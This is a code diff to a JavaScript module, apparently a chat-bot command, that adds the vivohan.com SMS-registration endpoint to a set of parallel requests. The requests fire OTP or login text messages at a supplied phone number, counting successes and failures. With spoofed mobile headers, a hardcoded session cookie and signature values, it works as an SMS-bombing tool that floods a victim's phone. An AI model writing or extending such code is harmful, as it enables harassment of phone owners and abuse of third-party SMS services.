@@ -60,15 +60,67 @@ module.exports = {
     };
 
     const kimungvayHeaders = {
-      'Host': 'api.kimungvay.co',
-      'Accept': 'application/json, text/plain, */*',
-      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Origin': 'https://h5.kimungvay.site',
-      'Referer': 'https://h5.kimungvay.site/',
-    };
+  'Host': 'api.kimungvay.co',
+  'Accept': 'application/json, text/plain, */*',
+  'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+  'Content-Type': 'application/x-www-form-urlencoded',
+  'Origin': 'https://h5.kimungvay.site',
+  'Referer': 'https://h5.kimungvay.site/',
+  'X-Requested-With': 'mark.via.gp',
+  'Sec-Fetch-Site': 'cross-site',
+  'Sec-Fetch-Mode': 'cors',
+  'Sec-Fetch-Dest': 'empty',
+  'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+};
 
     const kimungvayData = `phone=${phone}&type=2&ctype=1&chntoken=e51d233aa164cb9ec126578fc2d553f6`;
+
+        const vivohanCookies = {
+      'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
+    };
+
+    const vivohanHeaders = {
+      'Host': 'h5.vivohan.com',
+      'Connection': 'keep-alive',
+      'system': 'android',
+      'appcodename': 'Mozilla',
+      'deviceType': 'h5',
+      'screenresolution': '1080,1920',
+      'appname': 'Netscape',
+      'channel': 'e242',
+      'w': '1080',
+      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
+      'Content-Language': 'vn',
+      'Accept': 'application/json, text/plain, */*',
+      'platform': 'Linux i686',
+      'vendor': 'Google Inc.',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'h': '1920',
+      'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
+      'Origin': 'https://h5.vivohan.com',
+      'X-Requested-With': 'mark.via.gp',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'Referer': 'https://h5.vivohan.com/login',
+      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    };
+
+    const vivohanData = {
+      phone: phone,
+      type: 2,
+      timestamp: 1703951639000,
+      referrer: 'utm_source=e242',
+      af_prt: 'e242',
+      sign: '0f656af82eb1da33221a06d1171db265',
+      appversion: '1.0.0',
+      channel: 1,
+      app_version: '1.0.0',
+      version: '1.0.0',
+      imei: 'f30c673736f5301bd94aaaad5b543d90',
+      uuid: 'f30c673736f5301bd94aaaad5b543d90',
+      pkg_name: 'com.qcvivo.vivohanh5',
+    };
 
 
     // Initial message to be edited later
@@ -98,14 +150,19 @@ module.exports = {
         }), 
         axios.post("https://api.kimungvay.co/h5/LoginMessage_ultimate", kimungvayData, {
           headers: kimungvayHeaders
+        }), 
+        axios.post("https://h5.vivohan.com/api/register/app/sendSms", vivohanData, {
+          headers: vivohanHeaders,
+          withCredentials: true,
+          cookies: vivohanCookies,
         })
       ])
       .then(() => {
-        successCount += 3;
+        successCount += 4;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 3;
+        failureCount += 4;
         updateMessage();
       });
     };
